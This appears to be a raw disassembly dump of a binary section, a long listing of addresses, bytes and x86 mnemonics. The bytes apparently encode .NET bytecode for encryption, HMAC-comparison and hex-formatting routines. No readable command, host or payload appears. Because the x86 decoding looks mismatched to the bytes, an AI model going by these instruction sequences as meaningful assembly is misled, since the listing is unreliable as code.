  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 bc             	add    %dh,-0x44(%edx)
  4042d8:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 ea             	add    %dh,-0x16(%edx)
  40436b:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	40                   	inc    %eax
  404507:	27                   	daa
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 46    	or     %dl,0x4672060d(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 56    	or     %dl,0x5672060d(%ecx)
  4045ea:	27                   	daa
  4045eb:	00 70 09             	add    %dh,0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
